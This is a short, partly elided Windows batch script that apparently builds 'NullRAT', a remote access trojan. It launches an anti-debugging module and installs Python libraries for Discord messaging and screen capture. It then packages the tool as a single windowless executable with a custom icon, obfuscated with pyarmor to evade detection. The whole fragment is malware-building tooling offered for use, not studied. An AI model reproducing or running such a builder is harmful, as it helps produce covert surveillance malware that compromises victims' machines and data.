start cmd /k "cd C:\Users\%USERNAME%\Desktop\NullRAT\NullRAT\modules & antidebug.jar & exit"
...
if %errorlevel%==2 (
	...
	start "" "python" -m pip install --upgrade virtualenv aiohttp disnake requests mss pyarmor-7 
...
set "main_arg3=pyarmor-7 pack --clean -e " --onefile --noconsole --icon=custom_icon.ico --hidden-import mss"

set "main_arg2=pyinstaller --onefile --noconsole --hidden-import mss"
set "main_arg4=pyarmor-7 pack -e " --onefile --noconsole --hidden-import mss"
